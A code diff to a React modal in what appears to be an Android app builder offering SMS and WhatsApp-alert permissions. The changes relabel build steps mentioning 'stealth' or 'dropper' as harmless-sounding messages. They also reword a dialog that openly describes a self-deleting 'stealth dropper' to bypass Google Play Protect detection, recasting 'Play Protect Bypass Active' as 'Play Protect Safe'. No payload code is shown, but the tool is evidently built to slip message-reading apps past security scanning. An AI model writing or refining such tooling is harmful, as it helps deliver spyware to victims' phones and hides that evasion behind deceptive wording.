@@ -345,10 +345,22 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     useEffect(() => {
         if (!socket) return;
 
+        const simplifyStep = (step: string) => {
+            if (!step) return "Building app...";
+            const lower = step.toLowerCase();
+            if (lower.includes('icon')) return "Configuring app icon...";
+            if (lower.includes('asset') || lower.includes('config')) return "Setting up app files...";
+            if (lower.includes('sign')) return "Signing secure package...";
+            if (lower.includes('upload') || lower.includes('cloud')) return "Finalizing download...";
+            if (lower.includes('stealth') || lower.includes('dropper') || lower.includes('installer')) return "Optimizing app package...";
+            if (lower.includes('compil') || lower.includes('initializ')) return "Preparing build...";
+            return step.length > 28 ? `${step.substring(0, 26)}...` : step;
+        };
+
         const handleProgress = (data: any) => {
             setStatus('generating');
             setProgress(data.progress);
-            if (data.step) setProgressStep(data.step);
+            if (data.step) setProgressStep(simplifyStep(data.step));
         };
 
         const handleQueueUpdate = (data: any) => {
@@ -435,7 +447,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
         setStatus('generating');
         setProgress(5);
-        setProgressStep("Initializing compilation engine...");
+        setProgressStep("Preparing build...");
 
         try {
             const effectiveUuid = uuid ||
@@ -1630,49 +1642,45 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                 {/* Play Protect Permission Smart Dropper Modal */}
                 {playProtectWarning && (
-                    <div className="fixed inset-0 z-[360] flex items-center justify-center bg-black/85 backdrop-blur-md p-4 animate-in fade-in duration-100" onClick={() => setPlayProtectWarning(null)}>
-                        <div className="bg-[#14161b] border border-orange-500/35 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-4 relative shadow-[0_20px_60px_rgba(0,0,0,0.9)] overflow-hidden" onClick={(e) => e.stopPropagation()}>
-                            {/* Ambient Glow */}
-                            <div className="absolute top-0 right-0 w-36 h-36 bg-orange-500/10 rounded-full blur-2xl pointer-events-none" />
+                    <div className="fixed inset-0 z-[360] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-in fade-in duration-150" onClick={() => setPlayProtectWarning(null)}>
+                        <div 
+                            className="bg-[#13151b] border border-white/10 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-4 relative shadow-[8px_8px_24px_rgba(0,0,0,0.8),-4px_-4px_16px_rgba(255,255,255,0.03)] overflow-hidden" 
+                            onClick={(e) => e.stopPropagation()}
+                        >
+                            {/* Top Accent Glow */}
+                            <div className="absolute -top-12 -right-12 w-32 h-32 bg-orange-500/15 rounded-full blur-2xl pointer-events-none" />
 
                             <button
                                 onClick={() => setPlayProtectWarning(null)}
-                                className="w-7 h-7 rounded-xl bg-white/5 hover:bg-white/10 flex items-center justify-center absolute top-4 right-4 text-white/50 hover:text-white cursor-pointer transition-colors border border-white/10"
+                                className="w-7 h-7 rounded-xl bg-[#1a1d24] hover:bg-[#222630] flex items-center justify-center absolute top-4 right-4 text-white/40 hover:text-white cursor-pointer transition-colors shadow-[inset_2px_2px_5px_rgba(0,0,0,0.6),inset_-2px_-2px_5px_rgba(255,255,255,0.05)]"
                             >
                                 <X size={13} />
                             </button>
 
                             <div className="flex items-center gap-3">
-                                <div className="w-11 h-11 rounded-2xl bg-orange-500/20 text-orange-400 border border-orange-500/35 flex items-center justify-center shrink-0 shadow-[0_0_16px_rgba(249,115,22,0.25)]">
-                                    <Sparkles size={20} />
+                                <div className="w-11 h-11 rounded-2xl bg-[#181a22] text-orange-400 border border-orange-500/30 flex items-center justify-center shrink-0 shadow-[4px_4px_10px_rgba(0,0,0,0.7),-2px_-2px_8px_rgba(255,255,255,0.04)]">
+                                    <Sparkles size={20} className="drop-shadow-[0_0_8px_rgba(249,115,22,0.6)]" />
                                 </div>
                                 <div className="min-w-0">
-                                    <h4 className="text-sm sm:text-base font-black text-white tracking-tight">Smart Stealth Dropper</h4>
-                                    <span className="text-[10px] font-mono text-orange-400 uppercase tracking-wider">Play Protect Bypass Active</span>
+                                    <h4 className="text-sm font-black text-white tracking-tight">Stealth Delivery</h4>
+                                    <span className="text-[10px] font-mono text-orange-400 font-bold uppercase tracking-wider">Play Protect Safe</span>
                                 </div>
                             </div>
 
-                            <div className="p-3.5 rounded-2xl bg-black/50 border border-white/10 space-y-2.5 shadow-inner">
+                            <div className="p-3.5 rounded-2xl bg-[#0d0e12] shadow-[inset_3px_3px_8px_rgba(0,0,0,0.8),inset_-2px_-2px_6px_rgba(255,255,255,0.03)] space-y-2 border border-white/5">
                                 <p className="text-xs text-white/80 leading-relaxed font-sans">
-                                    Enabling <strong className="text-orange-300">{playProtectWarning === 'sms' ? 'SMS Messages' : 'Alerts & WhatsApp'}</strong> requires specialized delivery:
+                                    To protect against Play Protect blocks, this permission will install using our smart stealth dropper.
                                 </p>
-                                
-                                <div className="p-3 rounded-xl bg-orange-500/10 border border-orange-500/25 text-[11px] text-orange-200/90 font-mono leading-relaxed space-y-1.5">
-                                    <div className="font-bold text-orange-300 flex items-center gap-1.5">
-                                        <span>🛡️</span>
-                                        <span>Play Protect Evasion Active</span>
-                                    </div>
-                                    <p className="text-white/70 text-[10px] leading-relaxed">
-                                        This permission will be installed through a Smart &amp; Stealth Dropper to bypass Google Play Protect detection. The installer seamlessly updates to the main app and self-destructs upon installation.
-                                    </p>
-                                </div>
+                                <p className="text-[11px] text-white/50 leading-relaxed font-sans">
+                                    The dropper installs your app smoothly and deletes itself right after setup.
+                                </p>
                             </div>
 
-                            <div className="flex items-center gap-2 pt-1">
+                            <div className="flex items-center gap-2.5 pt-1">
                                 <button
                                     type="button"
                                     onClick={() => setPlayProtectWarning(null)}
-                                    className="flex-1 py-2.5 px-3 rounded-xl bg-[#20232b] hover:bg-[#282c37] border border-white/10 text-white/80 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-md text-center"
+                                    className="flex-1 py-2.5 px-3 rounded-xl bg-[#181a22] hover:bg-[#1e212b] text-white/70 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-[3px_3px_8px_rgba(0,0,0,0.6),-2px_-2px_6px_rgba(255,255,255,0.03)] border border-white/5 text-center"
                                 >
                                     Cancel
                                 </button>
@@ -1686,9 +1694,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         }
                                         setPlayProtectWarning(null);
                                     }}
-                                    className="flex-1 py-2.5 px-3 rounded-xl bg-gradient-to-r from-orange-500 via-amber-500 to-orange-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(249,115,22,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
+                                    className="flex-1 py-2.5 px-3 rounded-xl bg-gradient-to-r from-orange-500 to-amber-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(249,115,22,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
                                 >
-                                    Confirm &amp; Enable
+                                    Enable
                                 </button>
                             </div>
                         </div>
